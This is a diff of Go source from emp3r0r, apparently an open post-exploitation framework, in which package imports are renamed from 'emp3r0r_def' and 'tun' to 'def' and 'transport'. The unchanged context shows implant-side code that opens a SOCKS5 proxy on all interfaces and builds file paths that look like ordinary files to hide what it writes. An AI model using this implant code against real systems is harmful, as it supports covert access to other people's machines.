@@ -8,13 +8,13 @@ import (
 	"runtime"
 	"strings"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/txthinking/socks5"
 )
 
-var RuntimeConfig = &emp3r0r_def.Config{}
+var RuntimeConfig = &def.Config{}
 
 // Remember writable locations for later use
 var WritableLocations = []string{}
@@ -26,7 +26,7 @@ func ApplyRuntimeConfig() (err error) {
 	}
 
 	// parse JSON
-	err = emp3r0r_def.ReadJSONConfig(jsonData, RuntimeConfig)
+	err = def.ReadJSONConfig(jsonData, RuntimeConfig)
 	if err != nil {
 		short_view := jsonData
 		if len(jsonData) > 100 {
@@ -36,7 +36,7 @@ func ApplyRuntimeConfig() (err error) {
 	}
 
 	// CA
-	tun.CACrtPEM = []byte(RuntimeConfig.CAPEM)
+	transport.CACrtPEM = []byte(RuntimeConfig.CAPEM)
 
 	// pwd
 	cwd, err := os.Getwd()
@@ -58,7 +58,7 @@ func ApplyRuntimeConfig() (err error) {
 
 	// Socks5 proxy server
 	addr := fmt.Sprintf("0.0.0.0:%s", RuntimeConfig.AgentSocksServerPort)
-	emp3r0r_def.ProxyServer, err = socks5.NewClassicServer(
+	def.ProxyServer, err = socks5.NewClassicServer(
 		addr, "", // listen on emp3r0r_proxy_port
 		RuntimeConfig.ShadowsocksLocalSocksPort, // used as socks5 username
 		RuntimeConfig.Password,                  // socks5 password
@@ -108,7 +108,7 @@ func GetRandomWritablePath() (string, error) {
 	}
 
 	just_get_one := func() (string, error) {
-		rand_common_path := emp3r0r_def.CommonFilenames[util.RandInt(0, len(emp3r0r_def.CommonFilenames))]
+		rand_common_path := def.CommonFilenames[util.RandInt(0, len(def.CommonFilenames))]
 		suffixes := []string{"_tmp", "_temp", "_backup", "_copy"}
 		rand_suffix := suffixes[util.RandInt(0, len(suffixes))]
 		if util.IsExist(rand_common_path) {
@@ -119,7 +119,7 @@ func GetRandomWritablePath() (string, error) {
 
 		// make depth level higher
 		if strings.Count(rand_common_path, "/") < 2 {
-			level2Name := emp3r0r_def.CommonFilenames[util.RandInt(0, len(emp3r0r_def.CommonFilenames))]
+			level2Name := def.CommonFilenames[util.RandInt(0, len(def.CommonFilenames))]
 			rand_common_path = fmt.Sprintf("%s/%s", rand_common_path, level2Name)
 			// mkdir
 			if err := os.MkdirAll(rand_common_path, 0o755); err != nil {
